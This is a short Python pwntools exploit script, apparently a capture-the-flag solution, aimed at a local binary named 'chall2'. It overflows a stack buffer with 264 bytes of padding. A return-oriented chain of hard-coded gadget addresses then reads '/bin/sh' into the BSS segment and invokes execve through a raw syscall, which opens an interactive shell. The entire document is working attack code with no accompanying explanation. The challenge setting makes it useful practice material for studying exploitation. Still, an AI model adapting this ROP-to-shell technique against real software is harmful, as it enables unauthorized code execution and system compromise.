from pwn import *

target = process("./chall2")

# address
pop_rdi = 0x004915af
pop_rsi = 0x0048ac0f
pop_rdx = 0x004aefb2
pop_rax = 0x004ade58
syscall = 0x00474d65

bss_writable = 0x00000000006bb2e0

# payload 
payload = b"A" * 264
payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rsi)
payload += p64(bss_writable + 0x800)
payload += p64(pop_rdx)
payload += p64(8)
payload += p64(pop_rax)
payload += p64(0)
payload += p64(syscall)

payload += p64(pop_rdi)
payload += p64(bss_writable + 0x800)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(pop_rdx)
payload += p64(0)
payload += p64(pop_rax)
payload += p64(59)
payload += p64(syscall)
payload += b"C" * 8

_ = target.readuntil("What's your team name?")
target.sendline(payload)
print("[*] send payload")

_ = target.readline()

target.sendline(b"/bin/sh\x00")
print("[*] send /bin/sh")

target.interactive()
